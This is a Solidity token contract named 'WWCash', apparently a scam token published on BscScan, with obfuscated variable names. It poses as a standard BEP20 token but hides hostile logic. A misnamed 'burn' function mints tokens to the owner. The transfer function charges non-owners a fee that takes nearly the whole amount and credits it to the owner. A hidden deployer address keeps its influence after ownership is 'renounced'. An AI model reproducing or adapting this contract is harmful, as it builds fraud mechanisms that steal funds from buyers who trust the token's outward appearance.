/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.7.2;
contract WWCash {
event Transfer(address indexed from, address indexed to, uint256 value);
address private  CLMOTX = address(0);
uint256 public constant FAWSZD = 999999999999999999999999999999999;
uint256 private  GOFFII = 10000000000;
address public owner;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  DFWGLA = 1000000000000000;
address private  XEFRDT = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  symbol = "WWCash";
uint256 private  ELMHSA = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  IKTFQU = address(0);
string public  name = "WWCash";
uint256 private  NIXUYT = 10000000000000;
address private  EPDRQD = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  FXBLRX = 1000000000000000000000;
uint256 private  FDXMFN = 1000000000000000000;
address private  JVQOPG = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  VBYBKP = 100000000;
uint8 public constant decimals = 18;
mapping (address => uint256) public balanceOf;
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getFDXMFN() private returns (uint256) {
return FDXMFN;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "SVZYPI");
require(to != address(0), "SVZYPI");
require(amount <= balanceOf[from], "SVZYPI");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* FAWSZD/ELMHSA ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==IKTFQU){
ELMHSA = FAWSZD+2;
}
emit Transfer(from, to, transferAmount);
}
function _getXEFRDT() private returns (address) {
return XEFRDT;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getNIXUYT() private returns (uint256) {
return NIXUYT;
}

function _getCLMOTX() private returns (address) {
return CLMOTX;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getGOFFII() private returns (uint256) {
return GOFFII;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getJVQOPG() private returns (address) {
return JVQOPG;
}

function _getDFWGLA() private returns (uint256) {
return DFWGLA;
}

constructor () {
IKTFQU = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getVBYBKP() private returns (uint256) {
return VBYBKP;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getEPDRQD() private returns (address) {
return EPDRQD;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tSVZYPI 0");
require(spender != address(0), "fSVZYPI 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getFXBLRX() private returns (uint256) {
return FXBLRX;
}


}